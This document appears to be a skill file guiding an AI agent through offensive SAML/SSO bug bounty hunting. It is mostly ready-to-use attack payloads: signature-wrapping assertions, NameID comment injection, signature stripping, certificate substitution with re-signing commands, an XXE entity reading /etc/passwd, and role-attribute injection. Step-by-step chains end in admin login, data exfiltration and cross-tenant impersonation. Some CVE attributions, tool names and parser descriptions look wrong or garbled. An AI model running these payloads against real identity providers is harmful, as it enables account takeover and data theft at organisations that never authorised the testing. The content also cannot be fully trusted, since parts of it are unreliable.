---
name: hunt-saml
description: "Modern SAML/SSO hunting (2025-2026). Use when target has /saml, /Shibboleth.sso, /sso/saml, ADFS, Okta, Auth0, OneLogin, Ping, JumpCloud, Microsoft Entra/Azure AD SAML endpoints. Covers XSW1-XSW8 (XML Signature Wrapping), comment injection in NameID, signature stripping, signature exclusion, certificate substitution, audience/recipient not validated, replay attacks, IdP-confused-deputy, SAML in OAuth chain. Tools: SAML Raider, SAMLExtractor. PoC: log in as admin via altered NameID/AttributeStatement. Skip if no SAML AssertionConsumerService is reachable."
---

# SAML / SSO Hunt — 2025-2026 Powerful Edition

SAML pays because **one forged assertion = enterprise admin**. Auth0, Microsoft, Okta — all have paid out on XSW chains. Modern SAML libraries fix most XSW classes, but custom XML parsing remains rich attack surface.

> **PoC bar:** "Server accepted my modified assertion AND treated me as the modified user." Just having Burp say "signature still valid" is not enough.

---

## 0. 60-Second Recon

```bash
# Find SAML endpoints
ffuf -u https://target.com/FUZZ -w saml-paths.txt -mc 200,302
# paths: /saml /saml/login /saml/acs /Shibboleth.sso /Shibboleth.sso/SAML2/POST 
#        /sso/saml /sso/login /adfs /adfs/ls /adfs/services/trust /oauth2/saml2

# SP metadata (always public)
curl -ks https://target.com/saml/metadata
curl -ks https://target.com/.well-known/saml-metadata
curl -ks https://target.com/Shibboleth.sso/Metadata

# IdP metadata (look in SP metadata for `<md:IDPSSODescriptor>`)
# Or find IdP-initiated flow URL — start there.

# Capture a real SAML response with Burp
# Look for SAMLResponse= in /acs or /saml/post POST body
# Base64 decode → that's the XML to attack
```

**Fingerprint:**
- IdP: Okta, Auth0, OneLogin, ADFS, Ping, Azure AD, Google Workspace, Keycloak, custom
- SP: Shibboleth, SimpleSAMLphp, OneLogin RubyKit, OneLogin Java toolkit, custom
- Profile: HTTP-POST, HTTP-Redirect, Artifact
- Bindings: `urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST`
- NameID format: emailAddress, persistent, transient, unspecified
- Encryption: encrypted assertion (harder), signed-only (easier)

---

## 1. The Attack Matrix

| # | Attack | Detection | Effort | Bounty |
|---|--------|-----------|--------|--------|
| 1 | XSW1-XSW8 (Signature Wrapping) | sig validates but assertion swapped | 15 min | $5k–$30k |
| 2 | XML Comment Injection in NameID | `admin<!--x-->@target.com` parsed as `admin@target.com` | 10 min | $3k–$25k |
| 3 | Signature stripping | remove `<ds:Signature>` entirely | 5 min | $1k–$10k |
| 4 | XMLDSig signature exclusion | `<Signature/>` empty element accepted | 5 min | $1k–$5k |
| 5 | Certificate substitution | swap embedded `<KeyInfo><X509Cert>` | 10 min | $3k–$15k |
| 6 | Audience not validated | wrong `<Audience>` accepted | 5 min | $500–$3k |
| 7 | Recipient not validated | wrong `<SubjectConfirmationData Recipient>` | 5 min | $500–$3k |
| 8 | Assertion replay | reuse old assertion within validity | 5 min | $500–$5k |
| 9 | IdP confusion | sign with attacker IdP, target accepts | 15 min | $5k–$30k |
| 10 | SAML inside OAuth chain | SAML response loaded via OAuth callback | 20 min | $5k–$20k |
| 11 | XXE in SAML response | `<!DOCTYPE>` accepted by parser | 10 min | $3k–$15k |
| 12 | XSLT injection (legacy) | XSLT transform accepted | 15 min | $5k–$20k |
| 13 | NameID format manipulation | persistent → transient → new account | 5 min | $1k–$5k |
| 14 | AttributeStatement injection | inject `role:admin` attribute | 10 min | $3k–$15k |

---

## 2. XML Signature Wrapping (XSW1-XSW8) — THE main attack

The idea: XML signature validation finds and verifies the signed element, but XML processing reads a *different* unsigned element. By relocating the signed element (or wrapping it), you fool validators that don't track signed-element-identity post-validation.

### 2.1 XSW1 — Apply signature to inner element, add fake assertion outside
```xml
<Response>
  <Assertion ID="evil">       <!-- attacker's assertion, NameID=admin -->
    <Subject><NameID>admin@target.com</NameID></Subject>
  </Assertion>
  <Assertion ID="orig">       <!-- original assertion (signed) -->
    <Signature>...</Signature>
    <Subject><NameID>attacker@target.com</NameID></Subject>
  </Assertion>
</Response>
```
Validator sees signature → validates "orig" → OK. Processor reads first Assertion → "evil".

### 2.2 XSW2 — Sibling signed Assertion + injected Assertion
Same as XSW1 with order swapped.

### 2.3 XSW3-XSW8 — Different element placements
- XSW3: signed element inside `<Extensions>` of response
- XSW4: signed element wrapping injected element
- XSW5: signed element inside injected element
- XSW6: signed element in `<KeyInfo>` of itself
- XSW7: nest evil assertion inside Object element of signature
- XSW8: nest assertion inside the signed reference URI's target

### 2.4 SAML Raider one-click
```
Burp → SAML Raider tab → "XSW Attacks" → select XSW1-XSW8 → "Apply" → Forward
```

### 2.5 Confirmation
- Server returns 200 / 302 to dashboard
- You're logged in as `admin@target.com` (the injected NameID)
- The signed cert validates without error, but the role/identity is the injected one

### 2.6 Affected libraries (historical)
- OneLogin python-saml < 2.4
- ruby-saml < 1.12
- node-saml < 3.0
- SimpleSAMLphp < 1.18
- Custom XPath-based validators that don't pin to specific element ID

---

## 3. XML Comment Injection in NameID (the GitLab-class attack)

XML parser semantics differ: `Subject>admin<!--x-->@target.com</Subject` — some parsers treat the text as `admin@target.com`, some as `admin@target.com` (comment stripped but boundaries collapsed), some as `admin`.

### 3.1 Attack payload
Original assertion (your account):
```xml
<NameID>attacker@evil.com</NameID>
```
Modified (still passes signature on most libs because comment is "inside" the text node):
```xml
<NameID>admin@target.com<!--anything-->.evil.com</NameID>
```
Some implementations strip the comment AND its trailing text → resolves to `admin@target.com`.

### 3.2 Variations
```xml
<NameID>admin@target.com<!---->@evil.com</NameID>
<NameID>admin@target.com<!-- -->.evil.com</NameID>
<NameID>admin@target.com<![CDATA[<!--]]>@evil.com</NameID>
```

### 3.3 Real reports
- **CVE-2017-11427** OneLogin ruby-saml NameID confusion
- **CVE-2018-1056** ADFS comment injection
- Auth0, GitLab, GitHub — paid out 5-25k

---

## 4. Signature Stripping / Exclusion

### 4.1 Remove `<ds:Signature>` entirely
Some SPs accept unsigned assertions:
```xml
<Response>
  <Assertion>
    <Subject><NameID>admin@target.com</NameID></Subject>
    <!-- signature removed -->
  </Assertion>
</Response>
```

### 4.2 Empty Signature
```xml
<Signature></Signature>
<Signature/>
```

### 4.3 SignatureValue empty
```xml
<SignatureValue></SignatureValue>
```

### 4.4 Different element signed
- Sign the Response element instead of the Assertion → some libs check Response sig but trust unsigned Assertion data.

---

## 5. Certificate Substitution

Replace the embedded `<X509Certificate>` with your own (self-signed):
```xml
<KeyInfo>
  <X509Data>
    <X509Certificate>YOUR_CERT_BASE64</X509Certificate>
  </X509Data>
</KeyInfo>
```
Then sign with your private key. If SP doesn't pin trust to known IdP cert / cert thumbprint → accepts your forged sig as valid.

### 5.1 Test indicator
- SP fetches IdP cert from a fixed URL? → harder
- SP uses cert embedded in assertion? → easy substitute

---

## 6. Audience / Recipient Not Validated

`<AudienceRestriction>` and `<SubjectConfirmationData Recipient>` are part of the SAML response. If SP doesn't enforce:
- Assertion intended for SP-A can be replayed at SP-B
- Anyone with an Okta tenant signed assertion can log in to other Okta-using apps

```xml
<Audience>https://different-sp.target.com</Audience>      <!-- wrong, but accepted -->
```

---

## 7. Replay Attack

Capture a valid SAML response. Resubmit it later (within `<Conditions NotOnOrAfter>` window — usually 5 min, sometimes 1 hour).

Some SPs lack `<jti>`-equivalent uniqueness tracking → same assertion accepted N times.

### 7.1 Use case
- Replay to confirm session creates new each time → unlimited free auth
- Capture victim's assertion via MITM / referer leak → replay = ATO

---

## 8. IdP Confusion / Confused Deputy

Sign an assertion with **your** IdP private key, claim to be a trusted IdP via altered `<Issuer>` tag. If the SP trusts only the certificate (not iss-binding), it accepts.

```xml
<Issuer>https://trusted-idp.com/</Issuer>      <!-- claim trusted -->
<Signature>...</Signature>                       <!-- signed with attacker key -->
<KeyInfo>...attacker cert...</KeyInfo>
```

---

## 9. SAML inside OAuth Chain

Some apps support BOTH SAML SSO and OAuth, and the OAuth callback accepts SAML responses as the auth token. Find that endpoint:
```
POST /auth/callback?saml_response=<base64-saml>
```
Now you bridge SAML XSW to OAuth ATO.

---

## 10. XXE in SAML Response

Some parsers process external entities:
```xml
<!DOCTYPE response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Response>
  <Assertion>
    <Subject><NameID>&xxe;</NameID></Subject>
  </Assertion>
</Response>
```
If the parser is not hardened (Java with DocumentBuilder default config still accepts in some versions), XXE fires.

---

## 11. AttributeStatement Injection

```xml
<AttributeStatement>
  <Attribute Name="Role">
    <AttributeValue>admin</AttributeValue>
  </Attribute>
  <Attribute Name="Groups">
    <AttributeValue>org-admins</AttributeValue>
  </Attribute>
</AttributeStatement>
```
SP maps attributes to roles. Inject `admin` or `superuser` attribute → role escalation.

Combine with XSW: keep signed identity, add unsigned AttributeStatement.

---

## 12. Tools

```bash
# SAML Raider (Burp extension) — XSW1-XSW8 one-click
# https://github.com/CompassSecurity/SAMLRaider

# samlmagic (Python)
pip install saml2-tools

# Manual XML manipulation
xmlstarlet ed --inplace -d "//ds:Signature" response.xml

# Decoding
echo "<base64-saml>" | base64 -d | xmllint --format -

# Re-signing with your key
xmlsec1 sign --privkey-pem priv.pem,cert.pem assertion.xml
```

---

## 13. Disclosed Reports

| Target | Bounty | Technique |
|--------|--------|-----------|
| Auth0 | $25,000+ | XSW chain bypassing assertion validation |
| Microsoft (CVE-2018-1056) | KEV | ADFS XML comment injection |
| OneLogin (CVE-2017-11427) | bounty | NameID comment XML confusion |
| Okta | $15k+ | XSW class on enterprise tenants |
| Shopify | $10k+ | SAML SSO assertion replay |
| GitHub Enterprise | $25k | XML signature wrapping on SAML SSO |

---

## 14. Chain to Critical

### 14.1 XSW → admin login
1. Capture your own valid assertion.
2. Apply XSW1 with NameID=admin@target.com.
3. Submit to ACS → logged in as admin → enterprise data exfil.

### 14.2 Comment injection → cross-tenant
1. Modify NameID from `attacker@evil.com` to `admin@target.com<!--x-->.evil.com`.
2. SP resolves to admin@target.com.
3. Cross-tenant impersonation.

### 14.3 Certificate substitution → any user
1. Generate your own cert + key.
2. Replace `<X509Certificate>` in assertion.
3. Sign with your key.
4. SP accepts → forge any NameID.

---

## 15. Validation Gate

Before reporting:
1. **Logged in as the forged identity** (not just got "200 OK")?
2. **Tested on fresh victim account** (not your own)?
3. **Reproducible** — captured your own assertion, modified, resubmitted, worked?
4. **Signature validation actually happens** — confirm the SP isn't completely unauthenticated (that's a different bug class)?
5. **Not just enterprise demo SSO** — confirms on production SP?

---

## 16. Mantras

- XSW is alive. SAML Raider takes 30 seconds per attack class. Run all 8.
- XML parsers differ. Comment injection in NameID is still finding bugs in 2025.
- Custom SAML implementations >> commercial. Look for in-house XML parsing.
- A signed assertion with attacker-controlled `<Audience>` is dangerous. Test cross-SP replay.
- Chain SAML SSO with OAuth = double-bridge ATO. Look for `callback?saml_response=`.
- ADFS endpoints are notoriously old. Comment injection (CVE-2018-1056) still hits unpatched corp setups.
